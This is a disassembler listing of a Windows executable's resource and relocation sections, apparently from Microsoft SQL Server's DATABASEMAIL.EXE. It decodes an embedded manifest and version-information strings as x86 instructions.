  4061f5:	or     eax,0x3c20200a
  4061fa:	and    DWORD PTR ds:0x6449202d,ebp
  406200:	outs   dx,BYTE PTR gs:[esi]
  406202:	je     0x40626d
  406204:	data16 jns 0x406227
  406207:	je     0x406271
  406209:	and    BYTE PTR gs:[ecx+0x70],ah
  40620d:	jo     0x40627b
  40620f:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  406216:	and    BYTE PTR [ebx+0x65],dh
  406219:	arpl   WORD PTR [ebp+0x72],si
  40621c:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x75716572
  406224:	imul   esi,DWORD PTR [edx+0x65],0x746e656d
  40622b:	jae    0x40625b
  40622d:	and    BYTE PTR ds:0xa0d3e2d,ch
  406233:	or     eax,0x3c20200a
  406238:	je     0x4062ac
  40623a:	jne    0x4062af
  40623c:	je     0x406287
  40623e:	outs   dx,BYTE PTR ds:[esi]
  40623f:	outs   dx,WORD PTR ds:[esi]
  406241:	and    BYTE PTR [eax+0x6d],bh
  406244:	ins    BYTE PTR es:[edi],dx
  406245:	outs   dx,BYTE PTR ds:[esi]
  406246:	jae    0x406285
  406248:	and    dh,BYTE PTR [ebp+0x72]
  40624b:	outs   dx,BYTE PTR ds:[esi]
  40624c:	cmp    dh,BYTE PTR [ebx+0x63]
  40624f:	push   0x73616d65
  406254:	sub    eax,0x7263696d
  406259:	outs   dx,DWORD PTR ds:[esi]
  40625a:	jae    0x4062cb
  40625c:	data16 je 0x40628c
  40625f:	arpl   WORD PTR [edi+0x6d],bp
  406262:	cmp    ah,BYTE PTR [ecx+0x73]
  406265:	ins    DWORD PTR es:[edi],dx
  406266:	cs jbe 0x40629b
  406269:	and    bh,BYTE PTR [esi]
  40626b:	or     eax,0x2020200a
  406270:	and    BYTE PTR [ebx+esi*2],bh
  406273:	arpl   WORD PTR gs:[ebp+0x72],si
  406277:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40627f:	and    BYTE PTR [eax],ah
  406281:	and    BYTE PTR [eax],ah
  406283:	cmp    al,0x72
  406285:	gs jno 0x4062fd
  406288:	gs jae 0x4062ff
  40628b:	gs fs push eax
  40628e:	jb     0x4062f9
  406290:	jbe    0x4062fb
  406292:	ins    BYTE PTR es:[edi],dx
  406293:	gs addr16 gs jae 0x4062d6
  406298:	or     eax,0x2020200a
  40629d:	and    BYTE PTR [eax],ah
  40629f:	and    BYTE PTR [eax],ah
  4062a1:	and    BYTE PTR [edx+esi*2],bh
  4062a4:	gs jno 0x40631c
  4062a7:	gs jae 0x40631e
  4062aa:	gs fs inc ebp
  4062ad:	js     0x406314
  4062af:	arpl   WORD PTR [ebp+0x74],si
  4062b2:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  4062b9:	ins    BYTE PTR es:[edi],dx
  4062ba:	or     eax,0x2020200a
  4062bf:	and    BYTE PTR [eax],ah
  4062c1:	and    BYTE PTR [eax],ah
  4062c3:	and    BYTE PTR [eax],ah
  4062c5:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  4062c9:	gs ins BYTE PTR es:[edi],dx
  4062cb:	cmp    eax,0x49736122
  4062d0:	outs   dx,BYTE PTR ds:[esi]
  4062d1:	jbe    0x406342
  4062d3:	imul   esp,DWORD PTR [ebp+0x72],0x22
  4062d7:	or     eax,0x2020200a
  4062dc:	and    BYTE PTR [eax],ah
  4062de:	and    BYTE PTR [eax],ah
  4062e0:	and    BYTE PTR [eax],ah
  4062e2:	and    BYTE PTR [ebp+0x69],dh
  4062e5:	inc    ecx
  4062e6:	arpl   WORD PTR [ebx+0x65],sp
  4062e9:	jae    0x40635e
  4062eb:	cmp    eax,0x6c616622
  4062f0:	jae    0x406357
  4062f2:	and    ch,BYTE PTR [edi]
  4062f4:	ds or  eax,0x2020200a
  4062fa:	and    BYTE PTR [eax],ah
  4062fc:	and    BYTE PTR [eax],ah
  4062fe:	and    BYTE PTR [edi+ebp*1],bh
  406301:	jb     0x406368
  406303:	jno    0x40637a
  406305:	gs jae 0x40637c
  406308:	gs fs push eax
  40630b:	jb     0x406376
  40630d:	jbe    0x406378
  40630f:	ins    BYTE PTR es:[edi],dx
  406310:	gs addr16 gs jae 0x406353
  406315:	or     eax,0x2020200a
  40631a:	and    BYTE PTR [eax],ah
  40631c:	and    BYTE PTR [eax],ah
  40631e:	cmp    al,0x2f
  406320:	jae    0x406387
  406322:	arpl   WORD PTR [ebp+0x72],si
  406325:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40632d:	cmp    al,0x2f
  40632f:	je     0x4063a3
  406331:	jne    0x4063a6
  406333:	je     0x40637e
  406335:	outs   dx,BYTE PTR ds:[esi]
  406336:	outs   dx,WORD PTR ds:[esi]
  406338:	ds or  eax,0x612f3c0a
  40633e:	jae    0x4063b3
  406340:	gs ins DWORD PTR es:[edi],dx
  406342:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  406346:	or     eax,0x34049c0a
  40634b:	add    BYTE PTR [eax],al
  40634d:	add    BYTE PTR [esi+0x0],dl
  406350:	push   ebx
  406351:	add    BYTE PTR [edi+0x0],bl
  406354:	push   esi
  406355:	add    BYTE PTR [ebp+0x0],al
  406358:	push   edx
  406359:	add    BYTE PTR [ebx+0x0],dl
  40635c:	dec    ecx
  40635d:	add    BYTE PTR [edi+0x0],cl
  406360:	dec    esi
  406361:	add    BYTE PTR [edi+0x0],bl
  406364:	dec    ecx
  406365:	add    BYTE PTR [esi+0x0],cl
  406368:	inc    esi
  406369:	add    BYTE PTR [edi+0x0],cl
  40636c:	add    BYTE PTR [eax],al
  40636e:	add    BYTE PTR [eax],al
  406370:	mov    ebp,0xfeef04
  406375:	add    BYTE PTR [ecx],al
  406377:	add    BYTE PTR [eax],al
  406379:	add    BYTE PTR [ebx],cl
  40637b:	add    BYTE PTR [eax+eax*1],bh
  40637e:	xor    al,0x8
  406380:	add    BYTE PTR [eax],al
  406382:	or     eax,DWORD PTR [eax]
  406384:	cmp    al,0x0
  406386:	xor    al,0x8
  406388:	aas    
  406389:	add    BYTE PTR [eax],al
  40638b:	add    BYTE PTR [eax],cl
  40638d:	add    BYTE PTR [eax],al
  40638f:	add    BYTE PTR [eax],al
  406391:	add    BYTE PTR [eax+eax*1],al
  406394:	add    DWORD PTR [eax],eax
	...
  4063a2:	add    BYTE PTR [eax],al
  4063a4:	cli    
  4063a5:	add    eax,DWORD PTR [eax]
  4063a7:	add    BYTE PTR [ecx],al
  4063a9:	add    BYTE PTR [ebx+0x0],dl
  4063ac:	je     0x4063ae
  4063ae:	jb     0x4063b0
  4063b0:	imul   eax,DWORD PTR [eax],0x67006e
  4063b6:	inc    esi
  4063b7:	add    BYTE PTR [ecx+0x0],ch
  4063ba:	ins    BYTE PTR es:[edi],dx
  4063bb:	add    BYTE PTR [ebp+0x0],ah
  4063be:	dec    ecx
  4063bf:	add    BYTE PTR [esi+0x0],ch
  4063c2:	data16 add BYTE PTR [edi+0x0],ch
  4063c6:	add    BYTE PTR [eax],al
  4063c8:	(bad)  
  4063c9:	add    eax,DWORD PTR [eax]
  4063cb:	add    BYTE PTR [ecx],al
  4063cd:	add    BYTE PTR [eax],dh
  4063cf:	add    BYTE PTR [eax+eax*1],dh
  4063d2:	xor    BYTE PTR [eax],al
  4063d4:	cmp    DWORD PTR [eax],eax
  4063d6:	xor    BYTE PTR [eax],al
  4063d8:	xor    al,0x0
  4063da:	inc    edx
  4063db:	add    BYTE PTR [eax],dh
  4063dd:	add    BYTE PTR [eax],al
  4063df:	add    BYTE PTR [esi],ah
  4063e1:	add    BYTE PTR [edi],al
  4063e3:	add    BYTE PTR [ecx],al
  4063e5:	add    BYTE PTR [eax+0x0],dl
  4063e8:	ins    BYTE PTR es:[edi],dx
  4063e9:	add    BYTE PTR [ecx+0x0],ah
  4063ec:	je     0x4063ee
  4063ee:	data16 add BYTE PTR [edi+0x0],ch
  4063f2:	jb     0x4063f4
  4063f4:	ins    DWORD PTR es:[edi],dx
  4063f5:	add    BYTE PTR [eax],al
  4063f7:	add    BYTE PTR [esi+0x0],cl
  4063fa:	push   esp
  4063fb:	add    BYTE PTR [eax],ah
  4063fd:	add    BYTE PTR [eax+0x0],bh
  406400:	add    BYTE PTR ss:[eax+eax*1],dh
  406404:	add    BYTE PTR [eax],al
  406406:	add    BYTE PTR [eax],al
  406408:	mov    edx,0x1004900
  40640d:	add    BYTE PTR [eax+eax*1+0x65],cl
  406411:	add    BYTE PTR [edi+0x0],ah
  406414:	popa   
  406415:	add    BYTE PTR [eax+eax*1+0x54],ch
  406419:	add    BYTE PTR [edx+0x0],dh
  40641c:	popa   
  40641d:	add    BYTE PTR [eax+eax*1+0x65],ah
  406421:	add    BYTE PTR [ebp+0x0],ch
  406424:	popa   
  406425:	add    BYTE PTR [edx+0x0],dh
  406428:	imul   eax,DWORD PTR [eax],0x73
  40642b:	add    BYTE PTR [eax],al
  40642d:	add    BYTE PTR [eax],al
  40642f:	add    BYTE PTR [ebp+0x0],cl
  406432:	imul   eax,DWORD PTR [eax],0x720063
  406438:	outs   dx,DWORD PTR ds:[esi]
  406439:	add    BYTE PTR [ebx+0x0],dh
  40643c:	outs   dx,DWORD PTR ds:[esi]
  40643d:	add    BYTE PTR [esi+0x0],ah
  406440:	je     0x406442
  406442:	and    BYTE PTR [eax],al
  406444:	push   ebx
  406445:	add    BYTE PTR [ecx+0x0],dl
  406448:	dec    esp
  406449:	add    BYTE PTR [eax],ah
  40644b:	add    BYTE PTR [ebx+0x0],dl
  40644e:	add    BYTE PTR gs:[edx+0x0],dh
  406452:	jbe    0x406454
  406454:	add    BYTE PTR gs:[edx+0x0],dh
  406458:	and    BYTE PTR [eax],al
  40645a:	imul   eax,DWORD PTR [eax],0x200073
  406460:	popa   
  406461:	add    BYTE PTR [eax],ah
  406463:	add    BYTE PTR [edx+0x0],dh
  406466:	add    BYTE PTR gs:[edi+0x0],ah
  40646a:	imul   eax,DWORD PTR [eax],0x740073
  406470:	add    BYTE PTR gs:[edx+0x0],dh
  406474:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  406479:	add    BYTE PTR [eax+eax*1+0x72],dh
  40647d:	add    BYTE PTR [ecx+0x0],ah
  406480:	add    BYTE PTR fs:[ebp+0x0],ah
  406484:	ins    DWORD PTR es:[edi],dx
  406485:	add    BYTE PTR [ecx+0x0],ah
  406488:	jb     0x40648a
  40648a:	imul   eax,DWORD PTR [eax],0x20
  40648d:	add    BYTE PTR [edi+0x0],ch
  406490:	data16 add BYTE PTR [eax],ah
  406493:	add    BYTE PTR [ebp+0x0],cl
  406496:	imul   eax,DWORD PTR [eax],0x720063
  40649c:	outs   dx,DWORD PTR ds:[esi]
  40649d:	add    BYTE PTR [ebx+0x0],dh
  4064a0:	outs   dx,DWORD PTR ds:[esi]
  4064a1:	add    BYTE PTR [esi+0x0],ah
  4064a4:	je     0x4064a6
  4064a6:	and    BYTE PTR [eax],al
  4064a8:	inc    ebx
  4064a9:	add    BYTE PTR [edi+0x0],ch
  4064ac:	jb     0x4064ae
  4064ae:	jo     0x4064b0
  4064b0:	outs   dx,DWORD PTR ds:[esi]
  4064b1:	add    BYTE PTR [edx+0x0],dh
  4064b4:	popa   
  4064b5:	add    BYTE PTR [eax+eax*1+0x69],dh
  4064b9:	add    BYTE PTR [edi+0x0],ch
  4064bc:	outs   dx,BYTE PTR ds:[esi]
  4064bd:	add    BYTE PTR [esi],ch
  4064bf:	add    BYTE PTR [eax],al
  4064c1:	add    BYTE PTR [eax],al
  4064c3:	add    BYTE PTR [eax],ah
  4064c5:	add    BYTE PTR [eax+eax*1],al
  4064c8:	add    DWORD PTR [eax],eax
  4064ca:	inc    ebx
  4064cb:	add    BYTE PTR [edi+0x0],ch
  4064ce:	ins    DWORD PTR es:[edi],dx
  4064cf:	add    BYTE PTR [ebp+0x0],ch
  4064d2:	add    BYTE PTR gs:[esi+0x0],ch
  4064d6:	je     0x4064d8
  4064d8:	jae    0x4064da
  4064da:	add    BYTE PTR [eax],al
  4064dc:	push   ebx
  4064dd:	add    BYTE PTR [ecx+0x0],dl
  4064e0:	dec    esp
  4064e1:	add    BYTE PTR [eax],al
  4064e3:	add    BYTE PTR [esi],ah
  4064e5:	add    BYTE PTR ds:0x47000100,al
  4064eb:	add    BYTE PTR [edi+0x0],ch
  4064ee:	ins    BYTE PTR es:[edi],dx
  4064ef:	add    BYTE PTR [eax+eax*1+0x65],ah
  4064f3:	add    BYTE PTR [esi+0x0],ch
  4064f6:	inc    edx
  4064f7:	add    BYTE PTR [ecx+0x0],ch
  4064fa:	je     0x4064fc
  4064fc:	jae    0x4064fe
  4064fe:	add    BYTE PTR [eax],al
  406500:	push   esp
  406501:	add    BYTE PTR [edx+0x0],dh
  406504:	jne    0x406506
  406506:	add    BYTE PTR gs:[eax],al
  406509:	add    BYTE PTR [eax],al
  40650b:	add    BYTE PTR [eax+eax*1+0x16],cl
  40650f:	add    BYTE PTR [ecx],al
  406511:	add    BYTE PTR [ebx+0x0],al
  406514:	outs   dx,DWORD PTR ds:[esi]
  406515:	add    BYTE PTR [ebp+0x0],ch
  406518:	jo     0x40651a
  40651a:	popa   
  40651b:	add    BYTE PTR [esi+0x0],ch
  40651e:	jns    0x406520
  406520:	dec    esi
  406521:	add    BYTE PTR [ecx+0x0],ah
  406524:	ins    DWORD PTR es:[edi],dx
  406525:	add    BYTE PTR [ebp+0x0],ah
  406528:	add    BYTE PTR [eax],al
  40652a:	add    BYTE PTR [eax],al
  40652c:	dec    ebp
  40652d:	add    BYTE PTR [ecx+0x0],ch
  406530:	arpl   WORD PTR [eax],ax
  406532:	jb     0x406534
  406534:	outs   dx,DWORD PTR ds:[esi]
  406535:	add    BYTE PTR [ebx+0x0],dh
  406538:	outs   dx,DWORD PTR ds:[esi]
  406539:	add    BYTE PTR [esi+0x0],ah
  40653c:	je     0x40653e
  40653e:	and    BYTE PTR [eax],al
  406540:	inc    ebx
  406541:	add    BYTE PTR [edi+0x0],ch
  406544:	jb     0x406546
  406546:	jo     0x406548
  406548:	outs   dx,DWORD PTR ds:[esi]
  406549:	add    BYTE PTR [edx+0x0],dh
  40654c:	popa   
  40654d:	add    BYTE PTR [eax+eax*1+0x69],dh
  406551:	add    BYTE PTR [edi+0x0],ch
  406554:	outs   dx,BYTE PTR ds:[esi]
  406555:	add    BYTE PTR [eax],al
  406557:	add    BYTE PTR [edx+0x0],dl
  40655a:	adc    eax,0x46000100
  40655f:	add    BYTE PTR [ecx+0x0],ch
  406562:	ins    BYTE PTR es:[edi],dx
  406563:	add    BYTE PTR [ebp+0x0],ah
  406566:	inc    esp
  406567:	add    BYTE PTR [ebp+0x0],ah
  40656a:	jae    0x40656c
  40656c:	arpl   WORD PTR [eax],ax
  40656e:	jb     0x406570
  406570:	imul   eax,DWORD PTR [eax],0x740070
  406576:	imul   eax,DWORD PTR [eax],0x6e006f
  40657c:	add    BYTE PTR [eax],al
  40657e:	add    BYTE PTR [eax],al
  406580:	inc    esp
  406581:	add    BYTE PTR [ecx+0x0],ah
  406584:	je     0x406586
  406586:	popa   
  406587:	add    BYTE PTR [edx+0x0],ah
  40658a:	popa   
  40658b:	add    BYTE PTR [ebx+0x0],dh
  40658e:	add    BYTE PTR gs:[eax],ah
  406591:	add    BYTE PTR [ebp+0x0],cl
  406594:	popa   
  406595:	add    BYTE PTR [ecx+0x0],ch
  406598:	ins    BYTE PTR es:[edi],dx
  406599:	add    BYTE PTR [eax],ah
  40659b:	add    BYTE PTR [ebp+0x0],ah
  40659e:	outs   dx,BYTE PTR ds:[esi]
  40659f:	add    BYTE PTR [edi+0x0],ah
  4065a2:	imul   eax,DWORD PTR [eax],0x65006e
  4065a8:	add    BYTE PTR [eax],al
  4065aa:	add    BYTE PTR [eax],al
  4065ac:	jo     0x4065ae
  4065ae:	sub    BYTE PTR [eax],al
  4065b0:	add    DWORD PTR [eax],eax
  4065b2:	inc    esi
  4065b3:	add    BYTE PTR [ecx+0x0],ch
  4065b6:	ins    BYTE PTR es:[edi],dx
  4065b7:	add    BYTE PTR [ebp+0x0],ah
  4065ba:	push   esi
  4065bb:	add    BYTE PTR [ebp+0x0],ah
  4065be:	jb     0x4065c0
  4065c0:	jae    0x4065c2
  4065c2:	imul   eax,DWORD PTR [eax],0x6e006f
  4065c8:	add    BYTE PTR [eax],al
  4065ca:	add    BYTE PTR [eax],al
  4065cc:	xor    DWORD PTR [eax],eax
  4065ce:	xor    DWORD PTR [eax],eax
  4065d0:	add    BYTE PTR cs:[eax],dh
  4065d3:	add    BYTE PTR [esi],ch
  4065d5:	add    BYTE PTR [edx],dh
  4065d7:	add    BYTE PTR [ecx],dh
  4065d9:	add    BYTE PTR [eax],dh
  4065db:	add    BYTE PTR [eax],dh
  4065dd:	add    BYTE PTR [esi],ch
  4065df:	add    BYTE PTR [esi],dh
  4065e1:	add    BYTE PTR [eax],dh
  4065e3:	add    BYTE PTR [eax],ah
  4065e5:	add    BYTE PTR [eax],ch
  4065e7:	add    BYTE PTR [eax],ch
  4065e9:	add    BYTE PTR [ebx+0x0],dl
  4065ec:	push   ecx
  4065ed:	add    BYTE PTR [eax+eax*1+0x31],cl
  4065f1:	add    BYTE PTR [ecx],dh
  4065f3:	add    BYTE PTR [edi+0x0],bl
  4065f6:	push   edx
  4065f7:	add    BYTE PTR [eax+eax*1+0x4d],dl
  4065fb:	add    BYTE PTR [ecx],ch
  4065fd:	add    BYTE PTR [esi],ch
  4065ff:	add    BYTE PTR [ecx],dh
  406601:	add    BYTE PTR [edx],dh
  406603:	add    BYTE PTR [eax],dh
  406605:	add    BYTE PTR [edx],dh
  406607:	add    BYTE PTR [ecx],dh
  406609:	add    BYTE PTR [eax],dh
  40660b:	add    BYTE PTR ds:0x39003100,ch
  406611:	add    BYTE PTR [ecx],dh
  406613:	add    BYTE PTR [edi],dh
  406615:	add    BYTE PTR [eax],ah
  406617:	add    BYTE PTR [ecx],ch
  406619:	add    BYTE PTR [eax],al
  40661b:	add    BYTE PTR [edx],bh
  40661d:	add    BYTE PTR ds:0x49000100,cl
  406623:	add    BYTE PTR [esi+0x0],ch
  406626:	je     0x406628
  406628:	add    BYTE PTR gs:[edx+0x0],dh
  40662c:	outs   dx,BYTE PTR ds:[esi]
  40662d:	add    BYTE PTR [ecx+0x0],ah
  406630:	ins    BYTE PTR es:[edi],dx
  406631:	add    BYTE PTR [esi+0x0],cl
  406634:	popa   
  406635:	add    BYTE PTR [ebp+0x0],ch
  406638:	add    BYTE PTR gs:[eax],al
  40663b:	add    BYTE PTR [eax+eax*1+0x41],al
  40663f:	add    BYTE PTR [eax+eax*1+0x41],dl
  406643:	add    BYTE PTR [edx+0x0],al
  406646:	inc    ecx
  406647:	add    BYTE PTR [ebx+0x0],dl
  40664a:	inc    ebp
  40664b:	add    BYTE PTR [ebp+0x0],cl
  40664e:	inc    ecx
  40664f:	add    BYTE PTR [ecx+0x0],cl
  406652:	dec    esp
  406653:	add    BYTE PTR [eax],al
  406655:	add    BYTE PTR [eax],al
  406657:	add    BYTE PTR [esi+0x0],ch
  40665a:	and    eax,0x4c000100
  40665f:	add    BYTE PTR [ebp+0x0],ah
  406662:	add    BYTE PTR [bx+di+0x0],ah
  406666:	ins    BYTE PTR es:[edi],dx
  406667:	add    BYTE PTR [ebx+0x0],al
  40666a:	outs   dx,DWORD PTR ds:[esi]
  40666b:	add    BYTE PTR [eax+0x0],dh
  40666e:	jns    0x406670
  406670:	jb     0x406672
  406672:	imul   eax,DWORD PTR [eax],0x680067
  406678:	je     0x40667a
  40667a:	add    BYTE PTR [eax],al
  40667c:	dec    ebp
  40667d:	add    BYTE PTR [ecx+0x0],ch
  406680:	arpl   WORD PTR [eax],ax
  406682:	jb     0x406684
  406684:	outs   dx,DWORD PTR ds:[esi]
  406685:	add    BYTE PTR [ebx+0x0],dh
  406688:	outs   dx,DWORD PTR ds:[esi]
  406689:	add    BYTE PTR [esi+0x0],ah
  40668c:	je     0x40668e
  40668e:	and    BYTE PTR [eax],al
  406690:	inc    ebx
  406691:	add    BYTE PTR [edi+0x0],ch
  406694:	jb     0x406696
  406696:	jo     0x406698
  406698:	add    BYTE PTR cs:[eax],ah
  40669b:	add    BYTE PTR [ecx+0x0],al
  40669e:	ins    BYTE PTR es:[edi],dx
  40669f:	add    BYTE PTR [eax+eax*1+0x20],ch
  4066a3:	add    BYTE PTR [edx+0x0],dh
  4066a6:	imul   eax,DWORD PTR [eax],0x680067
  4066ac:	je     0x4066ae
  4066ae:	jae    0x4066b0
  4066b0:	and    BYTE PTR [eax],al
  4066b2:	jb     0x4066b4
  4066b4:	add    BYTE PTR gs:[ebx+0x0],dh
  4066b8:	add    BYTE PTR gs:[edx+0x0],dh
  4066bc:	jbe    0x4066be
  4066be:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  4066c3:	add    BYTE PTR [eax],al
  4066c5:	add    BYTE PTR [eax],al
  4066c7:	add    BYTE PTR [edx+0x0],cl
  4066ca:	adc    DWORD PTR [eax],eax
  4066cc:	add    DWORD PTR [eax],eax
  4066ce:	dec    edi
  4066cf:	add    BYTE PTR [edx+0x0],dh
  4066d2:	imul   eax,DWORD PTR [eax],0x690067
  4066d8:	outs   dx,BYTE PTR ds:[esi]
  4066d9:	add    BYTE PTR [ecx+0x0],ah
  4066dc:	ins    BYTE PTR es:[edi],dx
  4066dd:	add    BYTE PTR [esi+0x0],al
  4066e0:	imul   eax,DWORD PTR [eax],0x65006c
  4066e6:	outs   dx,BYTE PTR ds:[esi]
  4066e7:	add    BYTE PTR [ecx+0x0],ah
  4066ea:	ins    DWORD PTR es:[edi],dx
  4066eb:	add    BYTE PTR [ebp+0x0],ah
  4066ee:	add    BYTE PTR [eax],al
  4066f0:	inc    esp
  4066f1:	add    BYTE PTR [ecx+0x0],al
  4066f4:	push   esp
  4066f5:	add    BYTE PTR [ecx+0x0],al
  4066f8:	inc    edx
  4066f9:	add    BYTE PTR [ecx+0x0],al
  4066fc:	push   ebx
  4066fd:	add    BYTE PTR [ebp+0x0],al
  406700:	dec    ebp
  406701:	add    BYTE PTR [ecx+0x0],al
  406704:	dec    ecx
  406705:	add    BYTE PTR [eax+eax*1+0x2e],cl
  406709:	add    BYTE PTR [ebp+0x0],al
  40670c:	pop    eax
  40670d:	add    BYTE PTR [ebp+0x0],al
  406710:	add    BYTE PTR [eax],al
  406712:	add    BYTE PTR [eax],al
  406714:	dec    edx
  406715:	add    BYTE PTR ds:0x50000100,dl
  40671b:	add    BYTE PTR [edx+0x0],dh
  40671e:	outs   dx,DWORD PTR ds:[esi]
  40671f:	add    BYTE PTR [eax+eax*1+0x75],ah
  406723:	add    BYTE PTR [ebx+0x0],ah
  406726:	je     0x406728
  406728:	dec    esi
  406729:	add    BYTE PTR [ecx+0x0],ah
  40672c:	ins    DWORD PTR es:[edi],dx
  40672d:	add    BYTE PTR [ebp+0x0],ah
  406730:	add    BYTE PTR [eax],al
  406732:	add    BYTE PTR [eax],al
  406734:	dec    ebp
  406735:	add    BYTE PTR [ecx+0x0],ch
  406738:	arpl   WORD PTR [eax],ax
  40673a:	jb     0x40673c
  40673c:	outs   dx,DWORD PTR ds:[esi]
  40673d:	add    BYTE PTR [ebx+0x0],dh
  406740:	outs   dx,DWORD PTR ds:[esi]
  406741:	add    BYTE PTR [esi+0x0],ah
  406744:	je     0x406746
  406746:	and    BYTE PTR [eax],al
  406748:	push   ebx
  406749:	add    BYTE PTR [ecx+0x0],dl
  40674c:	dec    esp
  40674d:	add    BYTE PTR [eax],ah
  40674f:	add    BYTE PTR [ebx+0x0],dl
  406752:	add    BYTE PTR gs:[edx+0x0],dh
  406756:	jbe    0x406758
  406758:	add    BYTE PTR gs:[edx+0x0],dh
  40675c:	add    BYTE PTR [eax],al
  40675e:	add    BYTE PTR [eax],al
  406760:	add    BYTE PTR ds:0x50000100,cl
  406767:	add    BYTE PTR [edx+0x0],dh
  40676a:	outs   dx,DWORD PTR ds:[esi]
  40676b:	add    BYTE PTR [eax+eax*1+0x75],ah
  40676f:	add    BYTE PTR [ebx+0x0],ah
  406772:	je     0x406774
  406774:	push   esi
  406775:	add    BYTE PTR [ebp+0x0],ah
  406778:	jb     0x40677a
  40677a:	jae    0x40677c
  40677c:	imul   eax,DWORD PTR [eax],0x6e006f
  406782:	add    BYTE PTR [eax],al
  406784:	xor    DWORD PTR [eax],eax
  406786:	xor    DWORD PTR [eax],eax
  406788:	add    BYTE PTR cs:[eax],dh
  40678b:	add    BYTE PTR [esi],ch
  40678d:	add    BYTE PTR [edx],dh
  40678f:	add    BYTE PTR [ecx],dh
  406791:	add    BYTE PTR [eax],dh
  406793:	add    BYTE PTR [eax],dh
  406795:	add    BYTE PTR [esi],ch
  406797:	add    BYTE PTR [esi],dh
  406799:	add    BYTE PTR [eax],dh
  40679b:	add    BYTE PTR [eax],al
  40679d:	add    BYTE PTR [eax],al
  40679f:	add    BYTE PTR [eax+eax*1+0x0],al
  4067a3:	add    BYTE PTR [ecx],al
  4067a5:	add    BYTE PTR [esi+0x0],dl
  4067a8:	popa   
  4067a9:	add    BYTE PTR [edx+0x0],dh
  4067ac:	inc    esi
  4067ad:	add    BYTE PTR [ecx+0x0],ch
  4067b0:	ins    BYTE PTR es:[edi],dx
  4067b1:	add    BYTE PTR [ebp+0x0],ah
  4067b4:	dec    ecx
  4067b5:	add    BYTE PTR [esi+0x0],ch
  4067b8:	data16 add BYTE PTR [edi+0x0],ch
  4067bc:	add    BYTE PTR [eax],al
  4067be:	add    BYTE PTR [eax],al
  4067c0:	and    al,0x0
  4067c2:	add    al,0x0
  4067c4:	add    BYTE PTR [eax],al
  4067c6:	push   esp
  4067c7:	add    BYTE PTR [edx+0x0],dh
  4067ca:	popa   
  4067cb:	add    BYTE PTR [esi+0x0],ch
  4067ce:	jae    0x4067d0
  4067d0:	ins    BYTE PTR es:[edi],dx
  4067d1:	add    BYTE PTR [ecx+0x0],ah
  4067d4:	je     0x4067d6
  4067d6:	imul   eax,DWORD PTR [eax],0x6e006f
  4067dc:	add    BYTE PTR [eax],al
  4067de:	add    BYTE PTR [eax],al
  4067e0:	or     DWORD PTR [eax+esi*4],eax
  4067e3:	add    al,0x0
  4067e5:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

00408000 <.reloc>:
  408000:	add    BYTE PTR [eax+0x0],al
  408003:	add    BYTE PTR [eax+eax*1],cl
  408006:	add    BYTE PTR [eax],al
  408008:	xor    BYTE PTR [eax],bh
	...
